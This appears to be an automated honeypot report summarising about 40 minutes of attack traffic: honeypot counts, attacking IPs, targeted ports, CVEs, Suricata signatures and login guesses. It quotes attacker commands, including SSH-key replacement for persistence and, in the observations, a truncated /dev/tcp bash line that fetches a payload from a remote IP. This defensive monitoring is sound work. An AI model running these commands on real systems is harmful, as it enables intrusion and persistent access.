Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T13:01:45Z
**Timeframe:** 2025-10-16T12:20:01Z to 2025-10-16T13:00:02Z
**Files Used:**
- agg_log_20251016T122001Z.json
- agg_log_20251016T124001Z.json
- agg_log_20251016T130002Z.json

**Executive Summary**
This report summarizes 29,467 events collected from the honeypot network over a period of approximately 40 minutes. The majority of attacks were registered by the Cowrie and Suricata honeypots. The most prominent attack vector was VNC, with significant activity also targeting SSH and SMB protocols. A large number of automated attacks were observed, characterized by repetitive command execution and login attempts with common credentials. The most active attacking IP was 45.134.26.47.

**Detailed Analysis**

***Attacks by Honeypot***
- Cowrie: 10624
- Suricata: 7408
- Heralding: 4948
- Honeytrap: 2707
- Sentrypeer: 2161
- Ciscoasa: 1342
- Dionaea: 51
- Redishoneypot: 97
- H0neytr4p: 52
- Mailoney: 34
- Tanner: 16
- Honeyaml: 17
- ConPot: 4
- ssh-rsa: 2
- ElasticPot: 3
- Adbhoney: 1

***Top Attacking IPs***
- 45.134.26.47: 4934
- 10.17.0.5: 2300
- 103.104.48.212: 1574
- 10.140.0.3: 1369
- 137.184.179.27: 1239
- 134.199.194.239: 968
- 103.21.79.155: 949
- 196.251.88.103: 785
- 23.94.26.58: 700
- 107.155.93.174: 612

***Top Targeted Ports/Protocols***
- vnc/5900: 4932
- TCP/445: 2514
- 5060: 2161
- 22: 1468
- TCP/5900: 313
- 5903: 185
- 8333: 117
- 6379: 97
- 5901: 91
- 23: 34

***Most Common CVEs***
- CVE-2002-0013
- CVE-2002-0012
- CVE-2001-0414
- CVE-2021-3449
- CVE-2019-11500

***Commands Attempted by Attackers***
- uname -a
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- lockr -ia .ssh
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- Enter new UNIX password:
- Enter new UNIX password:

***Signatures Triggered***
- ET INFO VNC Authentication Failure
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET DROP Spamhaus DROP Listed Traffic Inbound group 42
- ET SCAN NMAP -sS window 1024
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN Potential SSH Scan
- ET INFO Reserved Internal IP Traffic
- ET SCAN Sipsak SIP scan

***Users / Login Attempts***
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- ftpuser/ftppassword
- root/123@@@
- root/QWE123!@#qwe
- guest/guest123456
- ftpuser/3245gs5662d34
- guest/999
- centos/99999
- config/11

***Files Uploaded/Downloaded***
- discovery
- soap-envelope
- soap-encoding
- addressing
- a:ReplyTo><a:To
- wsdl

***HTTP User-Agents***
- No user agents recorded.

***SSH Clients and Servers***
- No SSH clients or servers recorded.

***Top Attacker AS Organizations***
- No attacker AS organizations recorded.

**Key Observations and Anomalies**
- A significant number of attacks are coming from the IP address 45.134.26.47, primarily targeting VNC.
- The high number of "ET EXPLOIT [PTsecurity] DoublePulsar Backdoor" signatures suggests a campaign targeting SMB vulnerabilities.
- The commands executed are typical of initial reconnaissance and attempts to establish persistent access by adding SSH keys.
- The presence of commands like "nohup bash -c 'exec 6<>/dev/tcp/47.237.90.163/60129...'" indicates attempts to download and execute payloads from a remote server.
- The variety of honeypots triggered indicates a broad spectrum of scanning and exploitation attempts.
- The lack of HTTP User-Agents, SSH clients, and AS organization data might indicate that these specific data points were not captured or that the attacks did not involve protocols that would provide this information.
